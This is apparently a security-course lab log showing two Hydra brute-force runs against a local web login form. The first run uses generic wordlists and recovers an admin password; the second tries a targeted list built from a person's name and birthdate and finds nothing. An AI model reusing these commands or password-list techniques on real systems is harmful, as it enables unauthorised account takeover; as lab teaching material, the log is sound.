@@ -1,0 +1,47 @@
+(venv) mac@MacBook-Pro-3 lab12 % hydra -f -I -V -t 4 -w 8 -L wordlists/usernames.txt -P wordlists/passwords.txt -s 8001 127.0.0.1 http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid" 2>&1 | tee hydra_generic_output.txt
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-16 00:28:24
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 12 login tries (l:3/p:4), ~3 tries per task
+[DATA] attacking http-post-form://127.0.0.1:8001/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456" - 1 of 12 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "password" - 2 of 12 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345admin" - 3 of 12 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "admin" - 4 of 12 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "123456" - 5 of 12 [child 1] (0/0)
+[8001][http-post-form] host: 127.0.0.1   misc: /login:username=^USER^&password=^PASS^:F=Invalid   login: admin   password: 12345admin
+[STATUS] attack finished for 127.0.0.1 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-16 00:28:25
+(venv) mac@MacBook-Pro-3 lab12 % hydra -f -I -V -t 4 -w 8 -l admin -P custom_passwords.txt -s 8001 127.0.0.1 http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid" 2>&1 | tee hydra_targeted_output.txt
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-16 00:28:43
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 23 login tries (l:1/p:23), ~6 tries per task
+[DATA] attacking http-post-form://127.0.0.1:8001/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "19900512" - 1 of 23 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Johndoe" - 2 of 23 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "doe!" - 3 of 23 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "doe12" - 4 of 23 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "doe123" - 5 of 23 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "doe1234" - 6 of 23 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "doe1990" - 7 of 23 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "doe2020" - 8 of 23 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "doe2021" - 9 of 23 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john!" - 10 of 23 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john.doe" - 11 of 23 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john0512" - 12 of 23 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john1205" - 13 of 23 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john123" - 14 of 23 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john1234" - 15 of 23 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john1990" - 16 of 23 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john2020" - 17 of 23 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john2021" - 18 of 23 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "johnDoe" - 19 of 23 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "john_doe" - 20 of 23 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "johndoe" - 21 of 23 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "johndoe123" - 22 of 23 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "johndoe1990" - 23 of 23 [child 3] (0/0)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-16 00:28:44
+(venv) mac@MacBook-Pro-3 lab12 % 
